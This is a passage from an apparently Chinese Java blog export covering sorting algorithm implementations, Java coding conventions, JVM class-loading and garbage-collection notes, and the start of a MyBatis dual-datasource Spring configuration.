(i=1,2,…,n/2)时称之为堆。在这里只讨论满足前者条件的堆。由堆的定义可以看出，堆顶元素（即第一个元素）必为最大项（大顶堆）。完全二叉树可以很直观地表示堆的结构。堆顶为根，其它为左子树、右子树。初始时把要排序的数的序列看作是一棵顺序存储的二叉树，调整它们的存储序，使之成为一个堆，这时堆的根节点的数最大。然后将根节点与堆的最后一个节点交换。然后对前面(n-1)个数重新调整使之成为堆。依此类推，直到只有两个节点的堆，并对它们作交换，最后得到有n个节点的有序序列。从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。（2）实例：初始序列：46,79,56,38,40,84建堆：交换，从堆中踢出最大数依次类推：最后堆中剩余的最后两个结点交换，踢出一个，排序完成。 详解：https://www.cnblogs.com/chengxiao/p/6129630.html （3）用java实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import java.util.Arrays; public class HeapSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; public HeapSort(){ heapSort(a); } public void heapSort(int[] a){ System.out.println(\"开始排序\"); int arrayLength=a.length; //循环建堆 for(int i=0;i&lt;arrayLength-1;i++){ //建堆 buildMaxHeap(a,arrayLength-1-i); //交换堆顶和最后一个元素 swap(a,0,arrayLength-1-i); System.out.println(Arrays.toString(a)); } } private void swap(int[] data, int i, int j) { // TODO Auto-generated method stub int tmp=data[i]; data[i]=data[j]; data[j]=tmp; } //对data数组从0到lastIndex建大顶堆 private void buildMaxHeap(int[] data, int lastIndex) { // TODO Auto-generated method stub //从lastIndex处节点（最后一个节点）的父节点开始 for(int i=(lastIndex-1)/2;i&gt;=0;i--){ //k保存正在判断的节点 int k=i; //如果当前k节点的子节点存在 while(k*2+1&lt;=lastIndex){ //k节点的左子节点的索引 int biggerIndex=2*k+1; //如果biggerIndex小于lastIndex，即biggerIndex+1代表的k节点的右子节点存在 if(biggerIndex&lt;lastIndex){ //若果右子节点的值较大 if(data[biggerIndex]&lt;data[biggerIndex+1]){ //biggerIndex总是记录较大子节点的索引 biggerIndex++; } } //如果k节点的值小于其较大的子节点的值 if(data[k]&lt;data[biggerIndex]){ //交换他们 swap(data,k,biggerIndex); //将biggerIndex赋予k，开始while循环的下一次循环，重新保证k节点的值大于其左右子节点的值 k=biggerIndex; }else{ break; } } } }} 5、冒泡排序（1）基本思想：在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。（2）实例：（3）用java实现1234567891011121314151617public class bubbleSort { public bubbleSort(){ int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; int temp=0; for(int i=0;i&lt;a.length-1;i++){ for(int j=0;j&lt;a.length-1-i;j++){ if(a[j]&gt;a[j+1]){ temp=a[j]; a[j]=a[j+1]; a[j+1]=temp; } } } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 6、快速排序（1）基本思想：选择一个基准元素,通常选择第一个元素或者最后一个元素,通过一趟扫描，将待排序列分成两部分,一部分比基准元素小,一部分大于等于基准元素,此时基准元素在其排好序后的正确位置,然后再用同样的方法递归地排序划分的两部分。（2）实例： 时间复杂度：https://blog.csdn.net/qfikh/article/details/52870875 （3）用java实现123456789101112131415161718192021222324252627282930313233343536public class quickSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; public quickSort(){ quick(a); for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } public int getMiddle(int[] list, int low, int high) { int tmp = list[low]; //数组的第一个作为中轴 while (low &lt; high) { while (low &lt; high &amp;&amp; list[high] &gt;= tmp) { high--; } list[low] = list[high]; //比中轴小的记录移到低端 while (low &lt; high &amp;&amp; list[low] &lt;= tmp) { low++; } list[high] = list[low]; //比中轴大的记录移到高端 } list[low] = tmp; //中轴记录到尾 return low; //返回中轴的位置 } public void _quickSort(int[] list, int low, int high) { if (low &lt; high) { int middle = getMiddle(list, low, high); //将list数组进行一分为二 _quickSort(list, low, middle - 1); //对低字表进行递归排序 _quickSort(list, middle + 1, high); //对高字表进行递归排序 } } public void quick(int[] a2) { if (a2.length &gt; 0) { //查看数组是否为空 _quickSort(a2, 0, a2.length - 1); } } } 7、归并排序（1）基本排序：归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。（2）实例：（3）用java实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import java.util.Arrays; public class mergingSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; public mergingSort(){ sort(a,0,a.length-1); for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } public void sort(int[] data, int left, int right) { // TODO Auto-generated method stub if(left&lt;right){ //找出中间索引 int center=(left+right)/2; //对左边数组进行递归 sort(data,left,center); //对右边数组进行递归 sort(data,center+1,right); //合并 merge(data,left,center,right); } } public void merge(int[] data, int left, int center, int right) { // TODO Auto-generated method stub int [] tmpArr=new int[data.length]; int mid=center+1; //third记录中间数组的索引 int third=left; int tmp=left; while(left&lt;=center&amp;&amp;mid&lt;=right){ //从两个数组中取出最小的放入中间数组 if(data[left]&lt;=data[mid]){ tmpArr[third++]=data[left++]; }else{ tmpArr[third++]=data[mid++]; } } //剩余部分依次放入中间数组 while(mid&lt;=right){ tmpArr[third++]=data[mid++]; } while(left&lt;=center){ tmpArr[third++]=data[left++]; } //将中间数组中的内容复制回原数组 while(tmp&lt;=right){ data[tmp]=tmpArr[tmp++]; } System.out.println(Arrays.toString(data)); } } 8、基数排序（1）基本思想：将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后,数列就变成一个有序序列。（2）实例：（3）用java实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import java.util.ArrayList; import java.util.List; public class radixSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,101,56,17,18,23,34,15,35,25,53,51}; public radixSort(){ sort(a); for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } public void sort(int[] array){ //首先确定排序的趟数; int max=array[0]; for(int i=1;i&lt;array.length;i++){ if(array[i]&gt;max){ max=array[i]; } } int time=0; //判断位数; while(max&gt;0){ max/=10; time++; } //建立10个队列; List&lt;ArrayList&gt; queue=new ArrayList&lt;ArrayList&gt;(); for(int i=0;i&lt;10;i++){ ArrayList&lt;Integer&gt; queue1=new ArrayList&lt;Integer&gt;(); queue.add(queue1); } //进行time次分配和收集; for(int i=0;i&lt;time;i++){ //分配数组元素; for(int j=0;j&lt;array.length;j++){ //得到数字的第time+1位数; int x=array[j]%(int)Math.pow(10, i+1)/(int)Math.pow(10, i); ArrayList&lt;Integer&gt; queue2=queue.get(x); queue2.add(array[j]); queue.set(x, queue2); } int count=0;//元素计数器; //收集队列元素; for(int k=0;k&lt;10;k++){ while(queue.get(k).size()&gt;0){ ArrayList&lt;Integer&gt; queue3=queue.get(k); array[count]=queue3.get(0); queue3.remove(0); count++; } } } } }","link":"/2016/07/29/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/"},{"title":"Java 编码规范","text":"数据库 在数据库中涉及到命名时一律用全小写，单词之间用下划线分隔。 表明命名不要使用复数形式，例如user表不要起名为base_t_users。 命名可以借鉴使用以下格式：模块标识、对象类型、对象标识，以下划线区分。例如 base_t_user，base_v_user。 用 t 表达表，用 v 表达视图，特殊地， tj 表明这是一张关联表， j 代表join， ti 表明这是一张接口表， i 代表interface 所有的表都默认添加三个字段id，create_time 与 update_time。 主键统一命名为id，不要使用其他诸如【表名+id】的形式。例如 base_t_user 的主键不要使用 base_t_user_id。 所有布尔类型的字段，统一用 is_ 开头。例如 is_deleted 。布尔类型字段用于只有两个待选值的场景。 所有枚举类型的字段，统一用 enum_ 开头。例如 enum_state 。枚举类型字段用于多于两个待选值的场景。 所有json类型的字段，统一用 _json 结尾。因为在程序中将表现为string类型，需要在名称上显示出来该数据本身是json格式。 所有时间戳类型的字段，统一用 _time 结尾。 所有日期类型的字段，统一用 _date 结尾。 所有表达“总数”的字段，统一用 _total 结尾。 所有外键关联的字段，统一用 _id 结尾。 所有varchar类型字段，根据实际需要给定范围。 能给默认值的字段，一定要给默认值。比如布尔类型，创建日期等。 原则上非空或者不能重复的字段，要配置好相应约束。 PS：主键有效原则操作数据时，比如更新，删除等，尽量只提供根据主键操作的接口。即一般情况下，如果不知道某行数据的主键的话，将不能对其进行操作。 DAO和service层（1）DAO层 DAO层方法，如果参数达到四个以上，就封装成dto传入，反之则使用 @Param 注解，即不允许出现五个参数。 参数应该体现在方法名称上，使用 By…And…And… 的形式。前后顺序最好与参数列表中的顺序一致。这种命名可能导致名字很长，但是更加语义化。 update，insert，delete方法的返回值使用int，不要用void，哪怕int暂时用不着。 方法前缀： 返回一条结果： selectOne 返回多条结果： selectList 返回全部结果： selectAll 返回count： count 新增： insert 修改： update 假删除： delete 在DAO层中保持以上命名规则，在命名时，更多地使用SQL语言中的动词，比如select、insert、update等。以清楚地表明该方法直接操作了数据库。 （2）service层service层中避免使用以上的方法开头，也避免使用SQL语言中的关键字，应该倾向于体现业务逻辑。如： 返回一条结果： queryOne 返回多条结果： queryList 返回全部结果： queryAll 返回count： count 新增： save 修改： modify 假删除： remove 远端拉取调用数据，比如调用api返回等：使用 pull 开头，表明从远端“拉取”数据。 REST url设计在保证语义化的基础上，尽量简化单词，隐藏原有意义，避免暴露逻辑。 假如模块自身的业务接口统一以 /m 开头公用的API数据接口统一以 /a 开头 后续逐级细分功能，如/m/cross/book表明是一个自身业务模块，是模块当中的图书漂流，是图书漂流中的图书管理功能。 但以上url应该继续修正为： /m/c/b 或者 /m/b_c/b 这种形式，这样能避免用户从url中猜出业务逻辑。 REST风格要求在url上不体现操作动作，而全部使用名词来指定资源，在请求中指定操作动作，但实际应用中达不到这样的标准。所以建议统一用CRUD来代表增删改查四种操作，对于开发人员有足够的语义，对于用户也能起到足够的混淆。比如这样：/m/c/b/r/{bookId}即代表根据bookId读取一条记录。同样是查询，可能根据不同需求有多种实现，这时可以用数字划分，比如：/m/c/b/r/1/{groupId}即根据套系查询书籍。 尽量避免在url上提供参数，url上能提供的参数只应该有id，且只能有一个，即通过get请求，并将参数拼接在url上返回的场景，只能是单主键查询。其他的操作统一使用post请求。这样可以保持url的短小简洁。 PO,VO,DTO PO用于映射数据表，与数据库表对象严格一一对应，属性与表字段严格一一对应。 VO封装查询结果集，用于展示，根据查询复杂程度，内部可能有集合等复杂类型成员变量。VO本身不严格对应某张表，VO的字段也不严格映射表的字段。VO中禁止出现查询条件。 DTO用于封装查询参数，此类对象更多地服务于程序本身，可能封装一些跟数据库无关但是跟业务相关的参数，根据查询场景不同，也会封装分页参数。DTO中禁止出现结果集。 工具类和常量类（1）工具类工具类分两种，一种是以 tool 结尾，这种工具类更接近业务逻辑，依赖除JDK以外的包。一种是以 util 结尾，这种工具类更接近底层算法，除了JDK没有其他任何依赖。tool和util工具类类名统一加s或者不加s，比如不要同时出现 AUtil 与 BUtils。 （2）常量类常量类要将构造方法私有化，并在类名上加 final 前缀。内部的常量字段全部加 public static final 前缀。 单路单例配置配置功能应该有且仅有一种途径可以访问到。同样功能的配置只能有一处。比如某些配置需要有前台页面展示，让管理员可以修改，那么这些配置放在数据库中，绝对禁止同时放在配置文件中。而如果某些配置放在properties等类似配置文件中，那么绝对禁止通过某个页面访问修改。这样的原则避免二义性，使得配置有且仅有一个，也避免多处配置同步的问题。 方法 方法返回如果为集合类型，比如 List，则该集合不允许为null，无值的时候默认一个空的集合即可。 一般情况下，方法应该尽量有一个返回值而不使用void。比如DAO层的update，insert，delete方法返回值建议使用int。 方法使用动词开头。但是要尽量避免使用 get 和 set 开头，因为这样容易与属性访问器混淆。 一个方法尽可能只做一件事情，如果命名时候出现”做某件事and某件事”，就说明方法需要拆分。 方法尽量不超过50行，否则要尝试重构。 原则上，if后面需要接else。 方法在返回值时，能简写就简写。12345678910# 反例public int test() { int a = 1+1; return a;}# 正例public int test() { return 1+1;} 格式公约 【强制】大括号的使用约定。如果是大括号内为空，则简洁地写成{}即可，不需要换行 ； 如果是非空代码块则：1 ） 左大括号前不换行。2 ） 左大括号后换行。3 ） 右大括号前换行。4 ） 右大括号后还有 else 等代码则不换行 ； 表示终止右大括号后必须换行。 【强制】 左括号和后一个字符之间不出现空格 ； 同样，右括号和前一个字符之间也不出现空格。详见第 5 条下方正例提示。 【强制】 if / for / while / switch / do 等保留字与左右括号之间都必须加空格。 【强制】任何运算符左右必须加一个空格。说明：运算符包括赋值运算符=、逻辑运算符&amp;&amp;、加减乘除符号、三目运行符等。 【强制】缩进采用 4 个空格，禁止使用 tab 字符。说明：如果使用 tab 缩进，必须设置 1 个 tab 为 4 个空格。IDEA 设置 tab 为 4 个空格时，请勿勾选 Use tab character ；而在 eclipse 中，必须勾选 insert spaces for tabs 。 12345678910111213141516171819# 正例： （ 涉及 1-5 点 ）public static void main(String[] args) { // 缩进 4 个空格 String say = \"hello\"; // 运算符的左右必须有一个空格 int flag = 0; // 关键词 if 与括号之间必须有一个空格，括号内的 f 与左括号，0 与右括号不需要空格 if (flag == 0) { System.out.println(say); } // 左大括号前加空格且不换行；左大括号后换行 if (flag == 1) { System.out.println(\"world\"); // 右大括号前换行，右大括号后有 else，不用换行 } else { System.out.println(\"ok\"); // 在右大括号后直接结束，则必须换行 }} 【强制】单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：1） 第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。2 ） 运算符与下文一起换行。3 ） 方法调用的点符号与下文一起换行。4 ） 在多个参数超长，逗号后进行换行。5 ） 在括号前不要换行，见反例。 12345678910111213141516# 正例：StringBuffer sb = new StringBuffer();//超过 120 个字符的情况下，换行缩进 4 个空格，并且方法前的点符号一起换行sb.append(\"zi\").append(\"xin\")... .append(\"huang\")... .append(\"huang\")... .append(\"huang\");# 反例：StringBuffer sb = new StringBuffer();//超过 120 个字符的情况下，不要在括号前换行sb.append(\"zi\").append(\"xin\")...append(\"huang\");//参数很多的方法调用可能超过 120 个字符，不要在逗号前换行method(args1, args2, args3, ..., argsX); 【强制】方法参数在定义和传入时，多个参数逗号后边必须加空格。正例：下例中实参的” a “,后边必须要有一个空格。method(“a”, “b”, “c”); 【强制】 IDE 的 text file encoding 设置为 UTF -8 ; IDE 中文件的换行符使用 Unix 格式，不要使用 windows 格式。 【推荐】没有必要增加若干空格来使某一行的字符与上一行的相应字符对齐。正例：int a = 3;long b = 4L;float c = 5F;StringBuffer sb = new StringBuffer();说明：增加 sb 这个变量，如果需要对齐，则给 a 、 b 、 c 都要增加几个空格，在变量比较多的情况下，是一种累赘的事情。 【推荐】方法体内的执行语句组、变量的定义语句组、不同的业务逻辑之间或者不同的语义之间插入一个空行。相同业务逻辑和语义之间不需要插入空行。说明：没有必要插入多行空格进行隔开 其他看不懂的命名 方法参数太多或者方法太长 不写注释，或写没价值的注释 乱排版，不对齐 废代码 重复代码 各种嵌套 等等。。。 最后，代码虽然是给机器运行的，但最终还是给人看的。。。","link":"/2016/12/25/Java%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83/"},{"title":"Java虚拟机原理","text":"1、编译机制 分析和输入到符号表：词法分析：将代码转化为token序列语法分析：由token序列生成抽象语法树输入到符号表：将类中出现的符号输入到类的符号表 注解处理：处理用户自定义注解，之后继续第一步 根据符号表进行语义分析并生成class文件，并进行相关优化 虚拟机数据类型、字节码文件格式、虚拟机指令集 2、执行机制 2.1、加载、链接、初始化 2.1.1、加载 双亲委派、线程上下文类加载器、Web容器、OSGi：http://www.ibm.com/developerworks/cn/java/j-lo-classloader/ 2.1.2、链接校验：校验二进制字节码格式是否符合Java Class File Format规范准备：为类的静态属性分配内存和默认值，并加载引用的类或接口解析：将运行时常量池中的符号引用替换为直接引用(静态绑定) 2.1.3、初始化类的初始化时机：1) 创建类的实例2) 初始化某个类的子类（满足主动调用，即访问子类中的静态变量、方法）3) 反射（Class.forName()会触发，ClassLoader.loadClass()及X.class不会触发）4) 访问类或接口的静态变量（static final常量除外，static final变量可以）5) 调用类的静态方法6) java虚拟机启动时被标明为启动类的类 初始化顺序： 父类静态成员、静态代码块—&gt;子类静态成员、静态代码块—&gt;父类和子类实例成员内存分配—&gt;父类实例成员、代码块—&gt;父类构造函数—&gt;子类实例成员、代码块—&gt;子类构造函数 2.2、内存结构运行时数据区： 2.2.1、Java堆 JVM在Eden区分配一块内存为TLAB，在TLAB创建对象时不需要加锁，所以JVM首先在TLAB上创建对象，不够则在堆上创建。 2.2.2、方法区 静态绑定、动态绑定：http://hxraid.iteye.com/blog/428891 2.2.3、JVM栈 2.3、垃圾回收2.3.1、对象结构对象：对象头、对象体、字节填充 对象头：http://blog.csdn.net/bingjing12345/article/details/8642595 对象头的MarkWord用于存储对象的各种标记信息，实现锁、 哈希算法、垃圾回收等。后续为指向类方法区的引用及数组长度（若为数组）。 2.3.2、对象分配方式a. 堆上分配：指针碰撞、间隙列表b. 栈上分配：基于逃逸分析c. 堆外分配：Unsafe.allocateMemory()、DirectByteBuffer、ByteBuffer.allocateDicrect()或MappedByteBufferd. TLAB分配：Thread Local Allocation Buffer，多线程环境中JVM在Eden区分配一块内存为TLAB，在TLAB创建对象时不需要加锁，所以JVM首先在TLAB上创建对象，不够则在堆上创建。可通过-XX:TLABWasteTargetPercent设置TLAB和Eden的比例，可通过-XX:+PrintTLAB查看TLAB的使用情况。 2.3.3、垃圾回收算法引用计数器：为每个对象分配一个引用计数器，当计数器为0时回收对象，缺点：循环引用问题 复制：从根集合扫描存活对象，复制到一块全新内存空间，缺点：需要2倍内存空间，存活对象较多时开销较大 标记-清除：从根集合扫描并标记存活对象，扫描完成后清除未标记对象，缺点：存活对象较少时内存碎片较多 标记-清除-压缩：从根集合扫描并标记存活对象，扫描完成后将存活对象移动并对齐 分代回收：根据生命周期长短，把JVM堆分成新生代、老年代。 说明：根集合范围为Java堆中的对象(Card Table/Remember Set)、方法区中的静态对象、Java栈中的局部变量表和JNI句柄指向的对象。 2.3.4、JVM内存及垃圾回收配置-Xmx：设置最大堆内存，即新生代、老年代之和的最大值，该参数设置过小会触发OOM-Xms：设置最小堆内存，即JVM启动时的初始堆大小，一般设置和-Xmx相同，避免垃圾回收后JVM内存重分配-XX:NewSize：设置新生代的初始值-XX:MaxNewSize：设置新生代最大值-Xmn：等同于设置相同的-XX:NewSize和-XX:MaxNewSize，该参数设置过小会频繁GC-XX:PermSize：设置持久代初始值-XX:MaxPermSize：设置持久代最大值-Xss：设置线程栈大小-XX:NewRatio：设置老年代与新生代的比例-XX:SurvivorRatio：设置Eden区与S区的比例 -XX:MaxTenuringThreshold：设置垃圾回收最大年龄，即新生代中的对象经过多少次复制进入老年代-XX:PretenureSizeThreshold：设置大于指定大小的较大对象直接进行老年代 -XX:TargetSurvivorRatio：设置S区的可使用率，当S区的空间使用率达到这个数值，会将对象送入老年代 -XX:MinHeapFreeRatio：设置堆空间的最小空闲比例，当堆空间的空闲内存小于这个数值时，JVM便会扩展堆空间 -XX:MaxHeapFreeRatio：设置堆空间的最大空闲比例，当堆空间的空闲内存大于这个数值时，JVM便会压缩堆空间 新生代串行GC：使用复制算法，单线程STW新生代并行回收GC：使用复制算法，多线程STW，吞吐量优先：自动调整新生代Eden、S0、S1大小新生代并行GC：使用复制算法，多线程STW，新生代串行GC的多线程版本老年代串行GC：使用标记压缩算法，单线程STW老年代并行回收GC：使用标记压缩算法，多线程STW ，压缩方式比较特别，内存按线程数划分成不同区域，压缩时根据区域存活对象比例决定是否整块压缩老年代并发GC：使用标记清除算法。问题：① 占用更多CPU；② 浮动垃圾；③ 内存碎片：支持Full GC后的碎片整理清除，多线程不STW，但是碎片整理是STW； 说明：① -XX:+UserSerialGC为client默认方式，-XX:+UseParallelOldGC为server默认方式；② 分存分配方式：指针碰撞(bump-the-pointer)、空闲列表(free list)、TLAB；③ 根集合扫描加速：Card Table、Mod Union Table、Remembered Set；④ 新生代并行回收GC没有对Mod Union Table进行处理，因此不能和老年代并发GC一起工作；⑤ 使用 -XX:+HeapDumpOnOutOfMemoryError开启堆Dump； 优化方案：① 给新生代分配较大空间，因为Full GC比Mirror GC成本高；② 新生代进入老年代的年龄设置较大值，原因同上；③ 设置大对象直接进入老年代，因为新生代使用复制算法，并且占用两倍空间，大对象成本高；④ 最大和最小堆大小设置成一样，避免堆的调整；⑤ 吞吐量优先模式：并行回收GC；⑥ 响应时间优先模式：并发GC； 2.4、执行机制2.4.1、解释执行1) 栈顶缓存：将操作数栈顶中值直接缓存在寄存器上，计算后放回操作数栈2) 部分栈帧共享：调用方法时，后一方法可将前一方法的操作数栈作为当前方法的局部变量，节省数据拷贝消耗 2.4.2、编译执行对频繁执行的代码编译为机器码，对不频繁执行的代码继续使用解释方式，可通过CompileThreshold、OnStackReplacePercentage两个计数器进行配置 1) client编译（C1）：方法内联：方法较短时，将被调用方法的指令直接植入当前方法去虚拟化：如发现类中的方法只提供一个实现类，则对调用方进行内联冗余削除：根据运行时状况对代码进行折叠或削除 2) server编译（C2）：通过运行时信息，如分支判断（优先执行频率高的分支）和逃逸分析（变量是否被外部读取）等进行优化 标量替换：未用到对象的全部变量时，用标量替换聚合量，避免创建对象，节省内存，优化执行栈上分配：对象未逃逸时，直接在栈上创建对象，优化执行同步削除：对象未逃逸时，C2直接去掉同步 3) OSR编译（On-Stack Replacement）：只在循环代码体部分编译，其它部分仍然是解释执行 2.4.3、逆优化C1、C2不满足优化条件时，进行逆优化回到解释执行模式 2.4.4、反射执行1) 由于权限校验、所有方法扫描及Method对象的复制，getMethod()方法比较消耗性能，应该缓存返回的Method对象；2) Method.invoke()的性能瓶颈：参数的数组包装、方法可见性检查、参数的类型检查。可通过JDK7的MethodHandle提高性能；","link":"/2016/09/10/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8E%9F%E7%90%86/"},{"title":"MyBatis双数据源配置","text":"配置相关jdbc 配置12345678910111213141516171819202122232425262728293031323334#============================================================================# MySQL#============================================================================jdbc.mysql.driver=com.mysql.jdbc.Driverjdbc.mysql.url=jdbc:mysql://127.0.0.1:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=truejdbc.mysql.username=rootjdbc.mysql.password=root#============================================================================# MS SQL Server (JTDS)#============================================================================jdbc.sqlserver.driver=net.sourceforge.jtds.jdbc.Driverjdbc.sqlserver.url=jdbc:jtds:sqlserver://127.0.0.1:1433/testjdbc.sqlserver.username=sajdbc.sqlserver.password=sa#============================================================================# 通用配置#============================================================================jdbc.initialSize=5jdbc.minIdle=5jdbc.maxIdle=20jdbc.maxActive=100jdbc.maxWait=100000jdbc.defaultAutoCommit=falsejdbc.removeAbandoned=truejdbc.removeAbandonedTimeout=600jdbc.testWhileIdle=truejdbc.timeBetweenEvictionRunsMillis=60000jdbc.numTestsPerEvictionRun=20jdbc.minEvictableIdleTimeMillis=300000jdbc.properties 单数据源时的Spring配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd\"&gt; &lt;bean id=\"propertyConfigurer\" class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"&gt; &lt;property name=\"location\" value=\"classpath:jdbc.properties\"/&gt; &lt;/bean&gt; &lt;bean id=\"dataSource\" class=\"org.apache.commons.dbcp.BasicDataSource\" destroy-method=\"close\"&gt; &lt;property name=\"driverClassName\" value=\"${jdbc.mysql.driver}\"/&gt; &lt;property name=\"url\" value=\"${jdbc.mysql.url}\"/&gt; &lt;property name=\"username\" value=\"${jdbc.mysql.username}\"/&gt; &lt;property name=\"password\" value=\"${jdbc.mysql.password}\"/&gt; &lt;property name=\"initialSize\" value=\"${jdbc.initialSize}\"/&gt; &lt;property name=\"minIdle\" value=\"${jdbc.minIdle}\"/&gt; &lt;property name=\"maxIdle\" value=\"${jdbc.maxIdle}\"/&gt; &lt;property name=\"maxActive\" value=\"${jdbc.maxActive}\"/&gt; &lt;property name=\"maxWait\" value=\"${jdbc.maxWait}\"/&gt; &lt;property name=\"defaultAutoCommit\" value=\"${jdbc.defaultAutoCommit}\"/&gt; &lt;property name=\"removeAbandoned\" value=\"${jdbc.removeAbandoned}\"/&gt; &lt;property name=\"removeAbandonedTimeout\" value=\"${jdbc.removeAbandonedTimeout}\"/&gt; &lt;property name=\"testWhileIdle\" value=\"${jdbc.testWhileIdle}\"/&gt; &lt;property name=\"timeBetweenEvictionRunsMillis\" value=\"${jdbc.timeBetweenEvictionRunsMillis}\"/&gt; &lt;property name=\"numTestsPerEvictionRun\" value=\"${jdbc.numTestsPerEvictionRun}\"/&gt; &lt;property name=\"minEvictableIdleTimeMillis\" value=\"${jdbc.minEvictableIdleTimeMillis}\"/&gt; &lt;/bean&gt; &lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; &lt;!-- mybatis.spring自动映射 --&gt; &lt;bean class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\"&gt; &lt;property name=\"basePackage\" value=\"com.cnblogs.lzrabbit\"/&gt; &lt;/bean&gt; &lt;!-- 自动扫描，多个包以 逗号分隔 --&gt; &lt;context:component-scan base-package=\"com.cnblogs.lzrabbit\"/&gt; &lt;aop:aspectj-autoproxy/&gt;&lt;/beans&gt;applicationContext.xml 多数据源时Spring配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd\"&gt; &lt;bean id=\"propertyConfigurer\" class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"&gt; &lt;property name=\"location\" value=\"classpath:jdbc.properties\"/&gt; &lt;/bean&gt; &lt;bean id=\"sqlServerDataSource\" class=\"org.apache.commons.dbcp.BasicDataSource\" destroy-method=\"close\"&gt; &lt;property name=\"driverClassName\" value=\"${jdbc.sqlserver.driver}\"/&gt; &lt;property name=\"url\" value=\"${jdbc.sqlserver.url}\"/&gt; &lt;property name=\"username\" value=\"${jdbc.sqlserver.username}\"/&gt; &lt;property name=\"password\" value=\"${jdbc.sqlserver.password}\"/&gt; &lt;property name=\"initialSize\" value=\"${jdbc.initialSize}\"/&gt; &lt;property name=\"minIdle\" value=\"${jdbc.minIdle}\"/&gt; &lt;property name=\"maxIdle\" value=\"${jdbc.maxIdle}\"/&gt; &lt;property name=\"maxActive\" value=\"${jdbc.maxActive}\"/&gt; &lt;property name=\"maxWait\" value=\"${jdbc.maxWait}\"/&gt; &lt;property name=\"defaultAutoCommit\" value=\"${jdbc.defaultAutoCommit}\"/&gt; &lt;property name=\"removeAbandoned\" value=\"${jdbc.removeAbandoned}\"/&gt; &lt;property name=\"removeAbandonedTimeout\" value=\"${jdbc.removeAbandonedTimeout}\"/&gt; &lt;property name=\"testWhileIdle\" value=\"${jdbc.testWhileIdle}\"/&gt; &lt;property name=\"timeBetweenEvictionRunsMillis\" value=\"${jdbc.timeBetweenEvictionRunsMillis}\"/&gt; &lt;property name=\"numTestsPerEvictionRun\" value=\"${jdbc.numTestsPerEvictionRun}\"/&gt; &lt;property name=\"minEvictableIdleTimeMillis\" value=\"${jdbc.minEvictableIdleTimeMillis}\"/&gt; &lt;/bean&gt; &lt;bean id=\"mySqlDataSource\" class=\"org.apache.commons.dbcp.BasicDataSource\" destroy-method=\"close\"&gt; &lt;property name=\"driverClassName\" value=\"${jdbc.mysql.driver}\"/&gt; &lt;property name=\"url\" value=\"${jdbc.mysql.url}\"/&gt; &lt;property name=\"username\" value=\"${jdbc.mysql.username}\"/&gt; &lt;property name=\"password\" value=\"${jdbc.mysql.password}\"/&gt; &lt;property name=\"initialSize\" value=\"${jdbc.initialSize}\"/&gt; &lt;property name=\"minIdle\" value=\"${jdbc.minIdle}\"/&gt; &lt;property name=\"maxIdle\" value=\"${jdbc.maxIdle}\"/&gt; &lt;property name=\"maxActive\" value=\"${jdbc.maxActive}\"/&gt; &lt;property name=\"maxWait\" value=\"${jdbc.maxWait}\"/&gt; &lt;property name=\"defaultAutoCommit\" 